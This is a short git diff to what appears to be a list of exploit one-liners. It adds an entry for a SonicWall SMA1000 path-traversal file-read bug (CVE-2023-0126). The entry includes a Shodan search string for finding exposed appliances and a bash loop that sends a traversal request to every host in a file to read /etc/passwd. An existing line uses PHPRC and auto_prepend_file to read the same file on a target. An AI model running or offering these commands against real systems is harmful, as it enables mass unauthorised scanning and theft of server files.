@@ -24,3 +24,9 @@
 ```
 curl <TARGET> -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'
 ```
+### CVE-2023-0126 - SonicWall SMA1000 - File Read Bug
+##### Shodan Dork: title:"Appliance Management Console Login"
+###### Rohit Gautam
+```
+cat file.txt| while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULN";done
+```
